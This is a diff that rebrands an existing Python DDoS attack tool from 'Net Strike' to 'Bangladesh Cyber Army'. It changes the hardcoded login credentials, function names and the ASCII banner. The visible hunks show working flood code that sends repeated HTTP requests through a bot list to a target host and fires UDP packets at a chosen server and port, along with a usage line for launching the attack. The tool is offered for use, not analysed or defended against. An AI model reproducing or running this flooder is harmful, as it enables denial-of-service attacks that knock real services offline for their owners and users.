@@ -1,8 +1,8 @@
-correct_id = "sex-ddos"
-correct_password = "fuck-love"
+correct_id = "bca"
+correct_password = "bca"
 
 while True:
-    input_id = input("\033[1;34;40m Enter your ID: ")
+    input_id = input("\033[1;34;40m Enter Your User Name: ")
     input_password = input("\033[1;34;40m Enter your password: ")
 
     if input_id == correct_id and input_password == correct_password:
@@ -522,7 +522,7 @@ while True:
             return (bots)
 
 
-        def bot_hammering(url):
+        def bot_BCA(url):
             try:
                 while True:
                     req = urllib.request.urlopen(
@@ -545,7 +545,7 @@ while True:
                     if s.sendto(packet, (host, int(port))):
                         s.shutdown(1)
                         print("\033[92m", time.ctime(time.time()),
-                              "\033[0m \033[94m <--Packet sended by Net Strike ddos--> \033[0m")
+                              "\033[0m \033[94m <--Packet send by BCA ddos--> \033[0m")
                     else:
                         s.shutdown(1)
                         print("\033[91off shod<->down\033[0m")
@@ -566,21 +566,28 @@ while True:
         def dos2():
             while True:
                 item = w.get()
-                bot_hammering(random.choice(bots) + "http://" + host)
+                bot_BCA(random.choice(bots) + "http://" + host)
                 w.task_done()
 
 
         def usage():
             print(Fore.RED + '''
-        ███╗   ██╗███████╗████████╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
-        ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
-        ██╔██╗ ██║█████╗     ██║   ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
-        ██║╚██╗██║██╔══╝     ██║   ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
-        ██║ ╚████║███████╗   ██║   ███████║   ██║   ██║  ██║██║██║  ██╗███████╗
-        ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝ 
-                      \033[1;34;40m DDoS ATTACK \033[0;0m</> \033[0;49;92mNET STRIKE\033[0;0m 
-                        Author -> K I V Y </> ABH
-        \033[0;49;95m Example -> python3 netstrike.py -s 127.0.0.1 -p 443 -t 200
+ _______  _______        ______           __                               ______                        
+|       \|       \      /      \         |  \                             /      \                       
+| ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\    |  ▓▓▓▓▓▓\__    __| ▓▓____   ______   ______      |  ▓▓▓▓▓▓\______ ____  __    __ 
+| ▓▓__/ ▓▓ ▓▓  | ▓▓    | ▓▓   \▓▓  \  |  \ ▓▓    \ /      \ /      \     | ▓▓__| ▓▓      \    \|  \  |  \
+| ▓▓    ▓▓ ▓▓  | ▓▓    | ▓▓     | ▓▓  | ▓▓ ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\    | ▓▓    ▓▓ ▓▓▓▓▓▓\▓▓▓▓\ ▓▓  | ▓▓
+| ▓▓▓▓▓▓▓\ ▓▓  | ▓▓    | ▓▓   __| ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓    ▓▓ ▓▓   \▓▓    | ▓▓▓▓▓▓▓▓ ▓▓ | ▓▓ | ▓▓ ▓▓  | ▓▓
+| ▓▓__/ ▓▓ ▓▓__/ ▓▓    | ▓▓__/  \ ▓▓__/ ▓▓ ▓▓__/ ▓▓ ▓▓▓▓▓▓▓▓ ▓▓          | ▓▓  | ▓▓ ▓▓ | ▓▓ | ▓▓ ▓▓__/ ▓▓
+| ▓▓    ▓▓ ▓▓    ▓▓     \▓▓    ▓▓\▓▓    ▓▓ ▓▓    ▓▓\▓▓     \ ▓▓          | ▓▓  | ▓▓ ▓▓ | ▓▓ | ▓▓\▓▓    ▓▓
+ \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓       \▓▓▓▓▓▓ _\▓▓▓▓▓▓▓\▓▓▓▓▓▓▓  \▓▓▓▓▓▓▓\▓▓           \▓▓   \▓▓\▓▓  \▓▓  \▓▓_\▓▓▓▓▓▓▓
+                                |  \__| ▓▓                                                     |  \__| ▓▓
+                                 \▓▓    ▓▓                                                      \▓▓    ▓▓
+                                  \▓▓▓▓▓▓                                                        \▓▓▓▓▓▓ 
+
+                      \033[1;34;40m DDoS ATTACK \033[0;0m</> \033[0;49;92Bangladesh Cyber Army\033[0;0m 
+                        Author -> HackerR3z7 </> R3z7
+        \033[0;49;95m Example -> python3 bdbca.py -s 127.0.0.1 -p 443 -t 200
         \033[1;34;40m	-s : server ip\033[0;0m
         \033[0;49;33m	-p : port default 80\033[0;0m
         \033[0;49;92m	-t : turbo default 135   \033[92m
@@ -593,7 +600,7 @@ while True:
             global port
             global thr
             global item
-            optp = OptionParser(add_help_option=False, epilog="Hammers")
+            optp = OptionParser(add_help_option=False, epilog="BCA")
             optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",
                             const=logging.ERROR, default=logging.INFO)
             optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
